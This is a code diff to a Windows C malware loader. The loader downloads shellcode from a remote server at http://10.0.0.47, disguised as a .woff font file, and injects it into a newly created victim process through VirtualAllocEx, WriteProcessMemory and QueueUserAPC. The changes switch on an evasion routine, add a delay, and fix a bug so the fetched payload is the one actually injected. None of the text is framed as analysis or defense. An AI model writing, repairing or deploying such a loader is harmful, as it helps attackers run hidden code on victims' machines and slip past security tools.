@@ -74,9 +74,7 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 		}
 	}
 	
-
-
-	*pPayloadBytes = pBytes;
+    *pPayloadBytes = pBytes;
 	*sPayloadSize  = sSize;
 
 _EndOfFunction:
@@ -127,13 +125,15 @@ void evade() {
 };
 
 int main() {
-    //evade();
+    evade();
     LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = NULL;
-    
-    bool shellcode = GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
-    
+
+    GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
+
+	Sleep(5000);
+
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
 
@@ -145,8 +145,8 @@ int main() {
     LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-    
-    WriteProcessMemory(victimProcess, shellAddress, (LPCVOID)shellcode, sPayloadSize, NULL);
+
+    WriteProcessMemory(victimProcess, shellAddress, pPayloadBytes, sPayloadSize, NULL);
 
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
